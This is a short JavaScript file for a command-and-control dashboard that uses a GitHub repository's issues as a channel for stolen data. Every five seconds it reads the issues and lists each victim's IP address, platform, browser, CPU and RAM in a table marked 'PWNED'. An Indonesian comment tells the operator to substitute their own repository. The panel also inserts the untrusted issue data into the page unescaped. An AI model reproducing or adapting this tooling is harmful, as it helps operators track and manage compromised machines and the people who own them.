async function fetchVictims() {
    const repo = "username-lo/nusantara-c2"; // GANTI INI
    const tableBody = document.getElementById('victim-list');

    try {
        const response = await fetch(`https://api.github.com/repos/${repo}/issues?state=open`);
        const issues = await response.json();

        tableBody.innerHTML = ''; 

        issues.forEach(issue => {
            const data = JSON.parse(issue.body);
            const row = `
                <tr>
                    <td>${new Date(issue.created_at).toLocaleString()}</td>
                    <td>${data.ip || 'Unknown'}</td>
                    <td>${data.platform} / ${data.browser}</td>
                    <td>${data.cpu} Cores / ${data.ram}GB</td>
                    <td class="status-pwned">PWNED</td>
                </tr>
            `;
            tableBody.innerHTML += row;
        });
    } catch (err) {
        console.error("Gagal narik data C2:", err);
    }
}

setInterval(fetchVictims, 5000); // Auto-refresh setiap 5 detik
fetchVictims();
